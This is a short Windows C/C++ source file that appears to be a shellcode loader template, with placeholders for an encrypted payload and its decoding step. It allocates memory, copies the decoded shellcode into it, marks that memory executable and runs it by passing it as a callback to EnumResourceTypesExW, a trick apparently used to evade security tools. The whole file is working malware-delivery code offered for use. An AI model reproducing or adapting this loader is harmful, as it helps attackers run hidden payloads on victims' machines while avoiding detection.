#include <windows.h>
#include <ktmw32.h>
#include <wchar.h>
#include "base64.h"
#include "syscall.h"


#pragma comment(lib, "KtmW32.lib")

char Ciphertext[] = "<Ciphertext>";

int main() {
	LPVOID addr = VirtualAllocExNuma(GetCurrentProcess(), NULL, sizeof(Ciphertext), MEM_COMMIT, PAGE_READWRITE, 0);

	<decode>

	memcpy(addr, &shellcode[0], sizeof(Ciphertext));

	DWORD pflOldProtect;
	VirtualProtect(addr, sizeof(Ciphertext), PAGE_EXECUTE_READ, &pflOldProtect);

	EnumResourceTypesExW(::LoadLibraryW(L"Kernel32.dll"), (ENUMRESTYPEPROCW)addr, NULL, RESOURCE_ENUM_VALIDATE, NULL);

	return 0;
}